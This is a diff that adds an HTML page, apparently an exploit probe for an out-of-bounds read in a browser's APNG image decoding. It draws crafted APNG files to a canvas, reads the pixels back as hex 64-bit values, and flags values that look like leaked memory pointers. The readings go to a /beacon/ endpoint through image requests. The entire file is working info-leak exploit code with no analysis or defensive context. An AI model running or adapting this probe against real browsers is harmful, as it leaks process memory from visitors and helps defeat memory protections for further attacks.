@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V943B</title></head>
+<body><pre id="out">V943B — APNG OOB 64-bit groupings (heuristic, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V943B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,600))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
+function isPtrLike(lo,hi){
+  // heuristic only - not proof: nonzero, not obvious filler, 48-bit-ish user range patterns vary
+  if(lo==='00000000'&&hi==='00000000') return false;
+  if(lo==='aeaeaeaf'&&hi==='aeaeaeaf') return false;
+  if(lo==='00ff00ff'||lo==='ff0000ff') return false;
+  return true;
+}
+async function run(name,src,iter){
+  bk('T-PRE',name+'#'+iter);
+  try{
+    var im=await loadImg(src,iter); var c=document.createElement('canvas'); c.width=64; c.height=64;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,64,64); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,64,64).data;
+    var rows=[0,1,2,15]; var flags=[];
+    for(var ri=0;ri<rows.length;ri++){
+      var y=rows[ri], parts=[];
+      for(var x=16;x<=30;x+=2){
+        var lo=p32(d,64,x,y), hi=p32(d,64,x+1,y);
+        var q=lo+hi; var mark=isPtrLike(lo,hi)?'*':'';
+        parts.push(x+mark+'='+q);
+        if(mark) flags.push('y'+y+'@'+x+'='+q);
+      }
+      bk('Q',name+'#'+iter+'|y'+y+'|'+parts.join(' '));
+    }
+    bk('FLAGS',name+'#'+iter+'|'+(flags.length?flags.join(','):'none'));
+  }catch(e){ bk('T-ERR',name+'#'+iter+'|'+String(e&&e.message||e).slice(0,120)); }
+}
+(async function(){
+  bk('BOOT','qwords x16..30 step2, rows 0,1,2,15, iters=3 (*=heuristic non-filler/nonzero)');
+  await run('off0','v940b_off0.apng',0); await run('off0','v940b_off0.apng',1); await run('off0','v940b_off0.apng',2);
+  await run('off2','v940b_off2.apng',0); await run('off2','v940b_off2.apng',1); await run('off2','v940b_off2.apng',2);
+  bk('DONE','complete|note=heuristic-only; verify patterns across reloads');
+  say('\nV943B complete.');
+})();
+</script>
+</body></html>
